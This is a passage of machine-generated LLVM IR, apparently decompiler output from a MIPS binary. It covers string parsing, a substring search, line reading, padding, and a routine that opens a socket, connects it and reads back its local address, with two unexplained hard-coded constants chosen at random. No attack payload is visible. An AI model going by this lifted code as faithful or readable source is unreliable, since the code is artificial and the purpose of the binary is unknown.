  store i32 %v3_4041ec, i32* @t9, align 4
  %v2_4041f0 = ptrtoint i32* %stack_var_-48 to i32
  %v2_4041f4 = add i32 %v1_4041e8, %v2_4041f0
  %v1_4041f8 = load i32, i32* @s0, align 4
  %v2_4041f8 = inttoptr i32 %v1_4041f8 to i8*
  store i32 %v1_4041f8, i32* %a0.global-to-local, align 4
  %v7_4041f8 = call i32 @function_403fcc(i8* %v2_4041f8, i32 %v2_4041f4)
  %v0_404208 = load i32, i32* @s0, align 4
  %v2_40420c.pre = load i32, i32* @a2, align 4
  %extract.t10 = trunc i32 %v0_404208 to i8
  br label %dec_label_pc_40420c

dec_label_pc_40420c:                              ; preds = %dec_label_pc_40415c, %dec_label_pc_4041e8
  %v2_40420c = phi i32 [ %v0_404158, %dec_label_pc_40415c ], [ %v2_40420c.pre, %dec_label_pc_4041e8 ]
  %v0_40420c.off0 = phi i8 [ 48, %dec_label_pc_40415c ], [ %extract.t10, %dec_label_pc_4041e8 ]
  %v3_40420c = inttoptr i32 %v2_40420c to i8*
  store i8 %v0_40420c.off0, i8* %v3_40420c, align 1
  %v0_404210 = load i32, i32* @a2, align 4
  %v1_404210 = add i32 %v0_404210, 1
  %v2_404210 = inttoptr i32 %v1_404210 to i8*
  store i8 0, i8* %v2_404210, align 1
  %v0_404214.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_404214

dec_label_pc_404214:                              ; preds = %dec_label_pc_40413c, %dec_label_pc_40420c
  %v0_404214 = phi i32 [ 0, %dec_label_pc_40413c ], [ %v0_404214.pre, %dec_label_pc_40420c ]
  ret i32 %v0_404214

; uselistorder directives
  uselistorder i32 %v1_4041f8, { 1, 0 }
  uselistorder i32 %v0_4041c8, { 1, 2, 0 }
  uselistorder i32 %v1_4041c4, { 1, 0, 3, 2 }
  uselistorder i32 %v5_404190, { 0, 2, 1 }
  uselistorder i32 %v2_4041b0, { 1, 0 }
  uselistorder i32 %v0_404160, { 0, 2, 1, 3 }
  uselistorder i32* %t0.global-to-local, { 1, 0, 2 }
  uselistorder i32* %lo.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i8*, i32)* @function_403fcc, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_404214, { 1, 0 }
  uselistorder label %dec_label_pc_40420c, { 1, 0 }
  uselistorder label %dec_label_pc_4041e8, { 1, 0 }
  uselistorder label %dec_label_pc_404184, { 1, 0 }
}

define i32 @function_404228(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404228:
  %t1.global-to-local = alloca i32, align 4
  store i32 0, i32* %t1.global-to-local, align 4
  %v2_404228 = icmp sgt i32 %arg4, %arg2
  br i1 %v2_404228, label %dec_label_pc_404280, label %dec_label_pc_404230

dec_label_pc_404230:                              ; preds = %dec_label_pc_404228
  %v0_40423c.pre = load i32, i32* @v1, align 4
  %v0_404240.pre = load i32, i32* %t1.global-to-local, align 4
  br label %dec_label_pc_40423c

dec_label_pc_40423c:                              ; preds = %dec_label_pc_40426c, %dec_label_pc_404230
  %v0_404250 = phi i32 [ %v3_404278, %dec_label_pc_40426c ], [ 0, %dec_label_pc_404230 ]
  %v3_404250 = phi i32 [ %v1_404274, %dec_label_pc_40426c ], [ 0, %dec_label_pc_404230 ]
  %v0_404240 = phi i32 [ %v2_404270, %dec_label_pc_40426c ], [ %v0_404240.pre, %dec_label_pc_404230 ]
  %v0_40423c = phi i32 [ %v2_404274, %dec_label_pc_40426c ], [ %v0_40423c.pre, %dec_label_pc_404230 ]
  %v1_40423c = inttoptr i32 %v0_40423c to i8*
  %v2_40423c = load i8, i8* %v1_40423c, align 1
  %v1_404240 = inttoptr i32 %v0_404240 to i8*
  %v2_404240 = load i8, i8* %v1_404240, align 1
  %v2_404248 = icmp eq i8 %v2_40423c, %v2_404240
  br i1 %v2_404248, label %dec_label_pc_40424c, label %dec_label_pc_404264

dec_label_pc_40424c:                              ; preds = %dec_label_pc_40423c
  %v2_404250 = icmp eq i32 %v0_404250, %arg4
  %v4_404250 = add i32 %v3_404250, 1
  br i1 %v2_404250, label %dec_label_pc_404254, label %dec_label_pc_40426c

dec_label_pc_404254:                              ; preds = %dec_label_pc_40424c
  ret i32 %v4_404250

dec_label_pc_404264:                              ; preds = %dec_label_pc_40423c
  %v1_404268 = add i32 %v3_404250, 1
  br label %dec_label_pc_40426c

dec_label_pc_40426c:                              ; preds = %dec_label_pc_40424c, %dec_label_pc_404264
  %v2_404278 = phi i32 [ %v0_404250, %dec_label_pc_40424c ], [ 0, %dec_label_pc_404264 ]
  %v1_404274 = phi i32 [ %v4_404250, %dec_label_pc_40424c ], [ %v1_404268, %dec_label_pc_404264 ]
  %v2_40426c = icmp slt i32 %v1_404274, %arg2
  %v2_404270 = add i32 %v2_404278, %arg3
  store i32 %v2_404270, i32* %t1.global-to-local, align 4
  %v2_404274 = add i32 %v1_404274, %arg1
  %v1_404278 = icmp eq i1 %v2_40426c, false
  %v3_404278 = add i32 %v2_404278, 1
  br i1 %v1_404278, label %dec_label_pc_404280, label %dec_label_pc_40423c

dec_label_pc_404280:                              ; preds = %dec_label_pc_40426c, %dec_label_pc_404228
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_404270, { 1, 0 }
  uselistorder i32 %v1_404274, { 0, 2, 1 }
  uselistorder i32 %v2_404278, { 1, 0 }
  uselistorder i32 %v4_404250, { 1, 0 }
  uselistorder i32 %v3_404250, { 1, 0 }
  uselistorder i32* %t1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_40426c, { 1, 0 }
}

define i32 @function_404288(i64 %arg1) local_unnamed_addr {
dec_label_pc_404288:
  %tmp = trunc i64 %arg1 to i32
  %v0_404294.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_404294

dec_label_pc_404294:                              ; preds = %dec_label_pc_404294, %dec_label_pc_404294, %dec_label_pc_4042a8, %dec_label_pc_404288
  %v0_404294 = phi i32 [ %v0_404294.pre, %dec_label_pc_404288 ], [ %v1_404298, %dec_label_pc_4042a8 ], [ %v1_404298, %dec_label_pc_404294 ], [ %v1_404298, %dec_label_pc_404294 ]
  %v1_404294 = inttoptr i32 %v0_404294 to i8*
  %v2_404294 = load i8, i8* %v1_404294, align 1
  %v3_404294 = sext i8 %v2_404294 to i32
  %v1_404298 = add i32 %v0_404294, 1
  switch i8 %v2_404294, label %dec_label_pc_4042a8 [
    i8 32, label %dec_label_pc_404294
    i8 9, label %dec_label_pc_404294
  ]

dec_label_pc_4042a8:                              ; preds = %dec_label_pc_404294
  %v2_4042ac = icmp eq i8 %v2_404294, 10
  br i1 %v2_4042ac, label %dec_label_pc_404294, label %dec_label_pc_4042b0

dec_label_pc_4042b0:                              ; preds = %dec_label_pc_4042a8
  %v1_4042c0 = add i32 %v0_404294, 2
  %v2_404364 = icmp ugt i32 %tmp, 43
  br label %dec_label_pc_4042cc

dec_label_pc_4042cc:                              ; preds = %dec_label_pc_4043c0, %dec_label_pc_4042b0
  %v1_4043ec20 = phi i32 [ %v1_4043c8, %dec_label_pc_4043c0 ], [ 10, %dec_label_pc_4042b0 ]
  %v0_4042d8 = phi i32 [ %v0_4042d8824, %dec_label_pc_4043c0 ], [ %v1_4042c0, %dec_label_pc_4042b0 ]
  %v0_4042d0 = phi i32 [ %v0_4043cc23, %dec_label_pc_4043c0 ], [ %v3_404294, %dec_label_pc_4042b0 ]
  %v2_4042d0 = icmp eq i32 %v0_4042d0, 43
  br i1 %v2_4042d0, label %dec_label_pc_4042d4, label %dec_label_pc_4043ec

dec_label_pc_4042d4:                              ; preds = %dec_label_pc_4042cc
  %v1_4042d8 = inttoptr i32 %v0_4042d8 to i8*
  %v2_4042d8 = load i8, i8* %v1_4042d8, align 1
  %v3_4042d8 = sext i8 %v2_4042d8 to i32
  %v1_4042e0 = add i32 %v0_4042d8, 1
  %v7_4042e4 = urem i32 43, %tmp
  %v1_404300 = urem i32 %v3_4042d8, 256
  %fold = add nsw i32 %v3_4042d8, 208
  %v1_404308 = and i32 %fold, 254
  %v1_40430c = icmp ult i32 %v1_404308, 10
  %v1_404310 = icmp eq i1 %v1_40430c, false
  %v3_404310 = add nuw nsw i32 %v1_404300, 191
  br i1 %v1_404310, label %dec_label_pc_404320, label %dec_label_pc_404314

dec_label_pc_404314:                              ; preds = %dec_label_pc_4042d4
  %v1_40431c = add nsw i32 %v3_4042d8, -48
  br label %dec_label_pc_404320

dec_label_pc_404320:                              ; preds = %dec_label_pc_4042d4, %dec_label_pc_404314
  %v0_404330 = phi i32 [ %v1_404300, %dec_label_pc_4042d4 ], [ %v1_40431c, %dec_label_pc_404314 ]
  %v1_404320 = and i32 %v3_404310, 254
  %v1_404324 = icmp ult i32 %v1_404320, 26
  br i1 %v1_404324, label %dec_label_pc_404344, label %dec_label_pc_40432c

dec_label_pc_40432c:                              ; preds = %dec_label_pc_404320
  %v1_404330 = add nsw i32 %v0_404330, 159
  %v1_404334 = and i32 %v1_404330, 254
  %v1_404338 = icmp ult i32 %v1_404334, 26
  %v1_40433c = icmp eq i1 %v1_404338, false
  br i1 %v1_40433c, label %dec_label_pc_4043c0, label %dec_label_pc_404344

dec_label_pc_404344:                              ; preds = %dec_label_pc_40432c, %dec_label_pc_404320
  %v1_404344 = phi i32 [ 87, %dec_label_pc_40432c ], [ 55, %dec_label_pc_404320 ]
  %v2_404344 = sub nsw i32 %v3_4042d8, %v1_404344
  %v3_404348 = icmp slt i32 %v2_404344, %tmp
  %v4_404348 = zext i1 %v3_404348 to i32
  %v1_40434c = icmp eq i1 %v3_404348, false
  br i1 %v1_40434c, label %dec_label_pc_4043c0, label %dec_label_pc_404360

dec_label_pc_404360:                              ; preds = %dec_label_pc_404344
  br i1 %v2_404364, label %dec_label_pc_404368, label %dec_label_pc_404378

dec_label_pc_404368:                              ; preds = %dec_label_pc_404360
  %v2_40436c = icmp slt i32 %v7_4042e4, %v2_404344
  br i1 %v2_40436c, label %dec_label_pc_4043b0, label %dec_label_pc_404378

dec_label_pc_404378:                              ; preds = %dec_label_pc_404368, %dec_label_pc_404360
  br label %dec_label_pc_4043b0

dec_label_pc_4043b0:                              ; preds = %dec_label_pc_404368, %dec_label_pc_404378
  %v1_404394 = add i32 %v0_4042d8, 2
  br label %dec_label_pc_4043c0

dec_label_pc_4043c0:                              ; preds = %dec_label_pc_40432c, %dec_label_pc_404344, %dec_label_pc_4043b0
  %v0_4042d8824 = phi i32 [ %v1_404394, %dec_label_pc_4043b0 ], [ %v1_4042e0, %dec_label_pc_404344 ], [ %v1_4042e0, %dec_label_pc_40432c ]
  %v0_4043cc23 = phi i32 [ %v2_404344, %dec_label_pc_4043b0 ], [ %v2_404344, %dec_label_pc_404344 ], [ %v0_404330, %dec_label_pc_40432c ]
  %v1_4043cc = phi i32 [ 2147418112, %dec_label_pc_4043b0 ], [ %v4_404348, %dec_label_pc_404344 ], [ 87, %dec_label_pc_40432c ]
  %v0_4043c8 = phi i32 [ 2147483647, %dec_label_pc_4043b0 ], [ 0, %dec_label_pc_404344 ], [ 0, %dec_label_pc_40432c ]
  %v1_4043c8 = sub nsw i32 0, %v0_4043c8
  %v2_4043cc = icmp eq i32 %v0_4043cc23, %v1_4043cc
  br i1 %v2_4043cc, label %dec_label_pc_4043ec, label %dec_label_pc_4042cc

dec_label_pc_4043ec:                              ; preds = %dec_label_pc_4042cc, %dec_label_pc_4043c0
  %v1_4043ec22 = phi i32 [ %v1_4043c8, %dec_label_pc_4043c0 ], [ %v1_4043ec20, %dec_label_pc_4042cc ]
  ret i32 %v1_4043ec22

; uselistorder directives
  uselistorder i32 %v1_4043c8, { 1, 0 }
  uselistorder i32 %v1_404300, { 1, 0 }
  uselistorder i32 %v3_4042d8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_4042d8, { 0, 2, 1 }
  uselistorder i32 %v1_404298, { 2, 1, 0 }
  uselistorder i8 %v2_404294, { 1, 0, 2 }
  uselistorder i32 %v0_404294, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 2, 0 }
  uselistorder i32 43, { 1, 2, 0 }
  uselistorder i8 9, { 1, 0 }
  uselistorder label %dec_label_pc_4043ec, { 1, 0 }
  uselistorder label %dec_label_pc_4043c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4043b0, { 1, 0 }
  uselistorder label %dec_label_pc_404320, { 1, 0 }
  uselistorder label %dec_label_pc_404294, { 2, 1, 0, 3 }
}

define i32 @function_4043f4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4043f4:
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %s1.global-to-local, align 4
  store i32 %arg2, i32* %s4.global-to-local, align 4
  store i32 %arg3, i32* %s3.global-to-local, align 4
  store i32 %tmp, i32* @s0, align 4
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_404434

dec_label_pc_404434:                              ; preds = %dec_label_pc_404468.dec_label_pc_404434_crit_edge, %dec_label_pc_4043f4
  %v0_40443c = phi i32 [ %v0_40443c.pre, %dec_label_pc_404468.dec_label_pc_404434_crit_edge ], [ %arg3, %dec_label_pc_4043f4 ]
  %v0_404438 = phi i32 [ %v4_404454, %dec_label_pc_404468.dec_label_pc_404434_crit_edge ], [ %tmp, %dec_label_pc_4043f4 ]
  %v3_404434 = load i32, i32* @global_var_449c1c.188, align 4
  store i32 %v3_404434, i32* @t9, align 4
  %tmp14 = inttoptr i32 %v0_404438 to i32*
  %v6_404440 = call i32 @function_405110(i32 %v0_40443c, i32* %tmp14, i32 1)
  %v0_40444c = load i32, i32* @s0, align 4
  %v2_404454 = icmp eq i32 %v6_404440, 1
  %v4_404454 = add i32 %v0_40444c, 1
  store i32 %v4_404454, i32* @s0, align 4
  %v0_40445c = load i32, i32* %s2.global-to-local, align 4
  br i1 %v2_404454, label %dec_label_pc_404458, label %dec_label_pc_40447c

dec_label_pc_404458:                              ; preds = %dec_label_pc_404434
  %v1_40445c = add i32 %v0_40445c, 1
  store i32 %v1_40445c, i32* %s2.global-to-local, align 4
  %v1_404460 = load i32, i32* %s4.global-to-local, align 4
  %v2_404460 = icmp slt i32 %v1_40445c, %v1_404460
  %v1_404464 = icmp eq i1 %v2_404460, false
  br i1 %v1_404464, label %dec_label_pc_40447c, label %dec_label_pc_404468

dec_label_pc_404468:                              ; preds = %dec_label_pc_404458
  %v1_40446c = inttoptr i32 %v0_40444c to i8*
  %v2_40446c = load i8, i8* %v1_40446c, align 1
  %v2_404474 = icmp eq i8 %v2_40446c, 10
  br i1 %v2_404474, label %dec_label_pc_40447c, label %dec_label_pc_404468.dec_label_pc_404434_crit_edge

dec_label_pc_404468.dec_label_pc_404434_crit_edge: ; preds = %dec_label_pc_404468
  %v0_40443c.pre = load i32, i32* %s3.global-to-local, align 4
  br label %dec_label_pc_404434

dec_label_pc_40447c:                              ; preds = %dec_label_pc_404434, %dec_label_pc_404458, %dec_label_pc_404468
  %v0_40447c = phi i32 [ %v1_40445c, %dec_label_pc_404468 ], [ %v1_40445c, %dec_label_pc_404458 ], [ %v0_40445c, %dec_label_pc_404434 ]
  %v1_40447c = icmp eq i32 %v0_40447c, 0
  %v2_40447c = load i32, i32* %s1.global-to-local, align 4
  br i1 %v1_40447c, label %dec_label_pc_404480, label %dec_label_pc_40448c

dec_label_pc_404480:                              ; preds = %dec_label_pc_40447c
  store i32 0, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_40448c

dec_label_pc_40448c:                              ; preds = %dec_label_pc_40447c, %dec_label_pc_404480
  %v4_4044a4 = phi i32 [ %v2_40447c, %dec_label_pc_40447c ], [ 0, %dec_label_pc_404480 ]
  ret i32 %v4_4044a4

; uselistorder directives
  uselistorder i32 %v4_404454, { 1, 0 }
  uselistorder label %dec_label_pc_40448c, { 1, 0 }
  uselistorder label %dec_label_pc_40447c, { 2, 1, 0 }
}

define i32 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %v3_4044c4 = load i32, i32* @global_var_449c74.100, align 4
  store i32 %v3_4044c4, i32* @t9, align 4
  %v1_4044cc = call i32 @function_401d68()
  %v1_4044d4 = urem i32 %v1_4044cc, 2
  %v1_4044e0 = icmp eq i32 %v1_4044d4, 0
  %. = select i1 %v1_4044e0, i32 -1740966483, i32 -1136921171
  ret i32 %.

; uselistorder directives
  uselistorder i32 ()* @function_401d68, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_40450c() local_unnamed_addr {
dec_label_pc_40450c:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_404524 = load i32, i32* @s0, align 4
  %v3_40452c = load i32, i32* @global_var_449ca4.78, align 4
  store i32 %v3_40452c, i32* @t9, align 4
  store i32 16, i32* %stack_var_-40, align 4
  %v4_404540 = call i32 @function_406010(i32 2, i32 1, i32 0)
  store i32 %v4_404540, i32* @s0, align 4
  %v3_404558 = load i32, i32* @global_var_449bb0.120, align 4
  store i32 %v3_404558, i32* @t9, align 4
  %v2_40455c = icmp eq i32 %v4_404540, -1
  br i1 %v2_40455c, label %dec_label_pc_4045dc, label %dec_label_pc_404560

dec_label_pc_404560:                              ; preds = %dec_label_pc_40450c
  store i32 2, i32* %stack_var_-36, align 4
  %v6_404568 = call i32 @function_4044ac()
  %v3_404578 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404578, i32* @t9, align 4
  %v6_404580 = call i32 @function_4057a0()
  store i32 16, i32* @a2, align 4
  %v3_404590 = load i32, i32* @global_var_449d10.86, align 4
  store i32 %v3_404590, i32* @t9, align 4
  %v0_404594 = load i32, i32* @s0, align 4
  %v2_40459c = inttoptr i32 %v6_404580 to i32*
  store i32 0, i32* %v2_40459c, align 4
  %v6_40459c = bitcast i32* %stack_var_-36 to %sockaddr*
  %v7_40459c = call i32 @function_405cb0(i32 %v0_404594, %sockaddr* %v6_40459c)
  %v0_4045a8 = load i32, i32* @s0, align 4
  %v3_4045ac = load i32, i32* @global_var_449b10.189, align 4
  store i32 %v3_4045ac, i32* @t9, align 4
  %v3_4045b4 = ptrtoint i32* %stack_var_-40 to i32
  %v8_4045b4 = call i32 @function_405d10(i32 %v0_4045a8, %sockaddr* %v6_40459c, i32 %v3_4045b4)
  %v3_4045c4 = load i32, i32* @global_var_449b1c.60, align 4
  store i32 %v3_4045c4, i32* @t9, align 4
  %v1_4045cc = load i32, i32* @s0, align 4
  %v3_4045cc = call i32 @function_404de0(i32 %v1_4045cc)
  br label %dec_label_pc_4045dc

dec_label_pc_4045dc:                              ; preds = %dec_label_pc_40450c, %dec_label_pc_404560
  %v0_4045e8 = phi i32 [ 0, %dec_label_pc_40450c ], [ %v6_404568, %dec_label_pc_404560 ]
  store i32 %v0_404524, i32* @s0, align 4
  ret i32 %v0_4045e8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 ()* @function_4044ac, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_406010, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4045dc, { 1, 0 }
}

define i32 @function_4045f4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4045f4:
  %v1.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg2 to i8
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_4 = alloca i8, align 1
  store i32 %tmp2, i32* %v1.global-to-local, align 4
  %v3_404610 = load i32, i32* @global_var_449c54.93, align 4
  store i32 %v3_404610, i32* @t9, align 4
  store i32 1, i32* @a2, align 4
  %v1_40461c = icmp eq i32* %arg1, null
  store i8 %tmp, i8* %stack_var_4, align 1
  br i1 %v1_40461c, label %dec_label_pc_404644, label %dec_label_pc_404620

dec_label_pc_404620:                              ; preds = %dec_label_pc_4045f4
  %v2_404624 = load i32, i32* %arg1, align 4
  %v4_40462c = inttoptr i32 %v2_404624 to i8*
  store i8 %tmp, i8* %v4_40462c, align 1
  %v0_404630 = load i32, i32* %v1.global-to-local, align 4
  %v1_404630 = inttoptr i32 %v0_404630 to i32*
  %v2_404630 = load i32, i32* %v1_404630, align 4
  %v1_404638 = add i32 %v2_404630, 1
  store i32 %v1_404638, i32* %v1_404630, align 4
  br label %dec_label_pc_404644

dec_label_pc_404644:                              ; preds = %dec_label_pc_4045f4, %dec_label_pc_404620
  %v3_404644 = ptrtoint i8* %stack_var_4 to i32
  %v6_404644 = bitcast i8* %stack_var_4 to i32*
  %v7_404644 = call i32 @function_405370(i32 %v3_404644, i32* %v6_404644)
  ret i32 %v7_404644

; uselistorder directives
  uselistorder label %dec_label_pc_404644, { 1, 0 }
}

define i32 @function_404660(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404660:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg3, i32* %s0.global-to-local, align 4
  %v1_404694 = icmp slt i32 %arg3, 1
  store i32 %tmp, i32* %s1.global-to-local, align 4
  br i1 %v1_404694, label %dec_label_pc_4046e0, label %dec_label_pc_404698

dec_label_pc_404698:                              ; preds = %dec_label_pc_404660
  br label %dec_label_pc_4046a8

dec_label_pc_4046a8:                              ; preds = %dec_label_pc_4046a8, %dec_label_pc_404698
  %v0_4046ac = phi i32 [ %v3_4046b4, %dec_label_pc_4046a8 ], [ %tmp, %dec_label_pc_404698 ]
  %v0_4046a8 = phi i32 [ %v1_4046a8, %dec_label_pc_4046a8 ], [ 0, %dec_label_pc_404698 ]
  %v1_4046a8 = add i32 %v0_4046a8, 1
  %v1_4046ac = inttoptr i32 %v0_4046ac to i8*
  %v2_4046ac = load i8, i8* %v1_4046ac, align 1
  %v1_4046b4 = icmp eq i8 %v2_4046ac, 0
  %v3_4046b4 = add i32 %v0_4046ac, 1
  br i1 %v1_4046b4, label %dec_label_pc_4046b8, label %dec_label_pc_4046a8

dec_label_pc_4046b8:                              ; preds = %dec_label_pc_4046a8
  %v2_4046bc = icmp slt i32 %v1_4046a8, %arg3
  br i1 %v2_4046bc, label %dec_label_pc_4046d0, label %dec_label_pc_4046c4

dec_label_pc_4046c4:                              ; preds = %dec_label_pc_4046b8
  store i32 0, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4046d0

dec_label_pc_4046d0:                              ; preds = %dec_label_pc_4046b8, %dec_label_pc_4046c4
  %v0_4046d0 = phi i32 [ %arg3, %dec_label_pc_4046b8 ], [ 0, %dec_label_pc_4046c4 ]
  %v2_4046d0 = sub i32 %v0_4046d0, %v1_4046a8
  store i32 %v2_4046d0, i32* %s0.global-to-local, align 4
  %v1_4046d4 = and i32 %arg4, 2
  %v1_4046d8 = icmp eq i32 %v1_4046d4, 0
  br i1 %v1_4046d8, label %dec_label_pc_4046e0, label %dec_label_pc_4046e4

dec_label_pc_4046e0:                              ; preds = %dec_label_pc_4046d0, %dec_label_pc_404660
  br label %dec_label_pc_4046e4

dec_label_pc_4046e4:                              ; preds = %dec_label_pc_4046d0, %dec_label_pc_4046e0
  %v1_4046e4 = urem i32 %arg4, 2
  %v1_4046e8 = icmp eq i32 %v1_4046e4, 0
  br i1 %v1_4046e8, label %dec_label_pc_4046f8, label %dec_label_pc_4046ec

dec_label_pc_4046ec:                              ; preds = %dec_label_pc_4046e4
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_4046f8

dec_label_pc_4046f8:                              ; preds = %dec_label_pc_4046e4, %dec_label_pc_4046ec
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_404700

dec_label_pc_404700:                              ; preds = %dec_label_pc_404700.dec_label_pc_404700_crit_edge, %dec_label_pc_4046f8
  %v1_40470c = phi i32 [ %v1_40470c.pre, %dec_label_pc_404700.dec_label_pc_404700_crit_edge ], [ 0, %dec_label_pc_4046f8 ]
  %v3_404700 = load i32, i32* @global_var_449a80.88, align 4
  %v1_404708 = add i32 %v3_404700, 17908
  %v2_40470c = add i32 %v1_40470c, 1
  store i32 %v2_40470c, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404708)
  %v0_404718 = load i32, i32* %s0.global-to-local, align 4
  %v1_404718 = add i32 %v0_404718, -1
  store i32 %v1_404718, i32* %s0.global-to-local, align 4
  %v1_404720 = icmp sgt i32 %v1_404718, 0
  br i1 %v1_404720, label %dec_label_pc_404700.dec_label_pc_404700_crit_edge, label %dec_label_pc_404730

dec_label_pc_404700.dec_label_pc_404700_crit_edge: ; preds = %dec_label_pc_404700
  %v1_40470c.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_404700

dec_label_pc_404730:                              ; preds = %dec_label_pc_404700, %dec_label_pc_404730
  %v3_404730 = load i32, i32* @global_var_449a80.88, align 4
  %v1_404738 = add i32 %v3_404730, 17908
  %v1_40473c = load i32, i32* %s2.global-to-local, align 4
  %v2_40473c = add i32 %v1_40473c, 1
  store i32 %v2_40473c, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404738)
  %v0_404748 = load i32, i32* %s1.global-to-local, align 4
  %v1_404748 = inttoptr i32 %v0_404748 to i8*
  %v2_404748 = load i8, i8* %v1_404748, align 1
  %v1_404754 = icmp eq i8 %v2_404748, 0
  %v3_404754 = add i32 %v0_404748, 1
  store i32 %v3_404754, i32* %s1.global-to-local, align 4
  br i1 %v1_404754, label %dec_label_pc_404758, label %dec_label_pc_404730

dec_label_pc_404758:                              ; preds = %dec_label_pc_404730
  %v1_404770.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_404764

dec_label_pc_404764:                              ; preds = %dec_label_pc_404764, %dec_label_pc_404758
  %v1_404770 = phi i32 [ %v2_404770, %dec_label_pc_404764 ], [ %v1_404770.pre, %dec_label_pc_404758 ]
  %v3_404764 = load i32, i32* @global_var_449a80.88, align 4
  %v1_40476c = add i32 %v3_404764, 17908
  %v2_404770 = add i32 %v1_404770, 1
  store i32 %v2_404770, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_40476c)
  %v0_40477c = load i32, i32* %s0.global-to-local, align 4
  %v1_40477c = add i32 %v0_40477c, -1
  store i32 %v1_40477c, i32* %s0.global-to-local, align 4
  %v1_404788 = icmp sgt i32 %v1_40477c, 0
  br i1 %v1_404788, label %dec_label_pc_404764, label %dec_label_pc_40478c

dec_label_pc_40478c:                              ; preds = %dec_label_pc_404764
  ret i32 %v2_404770

; uselistorder directives
  uselistorder i32 %v2_404770, { 1, 2, 0 }
  uselistorder i32 %v0_4046ac, { 1, 0 }
  uselistorder i32* %s2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_404730, { 1, 0 }
  uselistorder label %dec_label_pc_4046f8, { 1, 0 }
  uselistorder label %dec_label_pc_4046e4, { 1, 0 }
  uselistorder label %dec_label_pc_4046d0, { 1, 0 }
}

define i32 @function_4047b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4047b0:
  %a1.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %stack_var_-29 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_4047b8 = load i32, i32* @t9, align 4
  %v2_4047b8 = add i32 %v1_4047b8, 316080
  store i32 %v2_4047b8, i32* %gp.global-to-local, align 4
  store i32 %arg3, i32* %s2.global-to-local, align 4
  store i32 %arg4, i32* %s3.global-to-local, align 4
  store i32 %arg5, i32* %t0.global-to-local, align 4
  %v0_4047e8 = load i32, i32* %a1.global-to-local, align 4
  %v1_4047e8 = icmp eq i32 %v0_4047e8, 0
  br i1 %v1_4047e8, label %dec_label_pc_4047ec, label %dec_label_pc_404820

dec_label_pc_4047ec:                              ; preds = %dec_label_pc_4047b0
  %v3_4047f0 = load i32, i32* @global_var_449a80.88, align 4
  store i32 48, i32* %v0.global-to-local, align 4
  store i32 %arg3, i32* @a2, align 4
  store i32 %arg4, i32* @a3, align 4
  %v2_404800 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_404800, i32* %a1.global-to-local, align 4
  store i32 48, i32* %stack_var_-40, align 4
  %v1_404808 = add i32 %v3_4047f0, 18016
  call void @__pseudo_call(i32 %v1_404808)
  store i32 %v2_4047b8, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_404820

dec_label_pc_404820:                              ; preds = %dec_label_pc_4047b0, %dec_label_pc_4047ec
  %v0_404820 = load i32, i32* @a3, align 4
  %v1_404820 = icmp eq i32 %v0_404820, 0
  store i32 10, i32* %v0.global-to-local, align 4
  br i1 %v1_404820, label %dec_label_pc_404820.dec_label_pc_404844_crit_edge, label %dec_label_pc_404824

